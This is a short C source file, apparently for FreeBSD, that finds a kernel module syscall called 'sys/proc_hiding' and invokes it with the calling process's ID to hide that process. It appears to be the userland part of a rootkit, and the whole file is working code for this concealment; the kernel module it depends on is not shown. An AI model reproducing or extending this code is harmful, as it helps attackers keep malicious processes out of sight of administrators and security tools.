#include <fcntl.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/param.h>
#include <sys/module.h>
#include <string.h>

#include "interface.h"

static int
find_syscall(const char *mod_name)
{
    struct module_stat mod_stat;
    int mod_id;

    mod_id = modfind(mod_name);

    if (mod_id == -1) {
        return -1;
    }

    memset(&mod_stat, 0, sizeof(mod_stat));
    mod_stat.version = sizeof(mod_stat);
    if (modstat(mod_id, &mod_stat) == -1) {
        return -1;
    }

    return mod_stat.data.intval;
}

void hide_process_syscall(void) {
    pid_t pid = getpid();
    
    int sysnum = find_syscall("sys/proc_hiding");
    if (sysnum == -1) {
        perror("error");
        return;       
    }
    if (syscall(sysnum, pid) == -1) {
        perror("error");
        return;
    }

}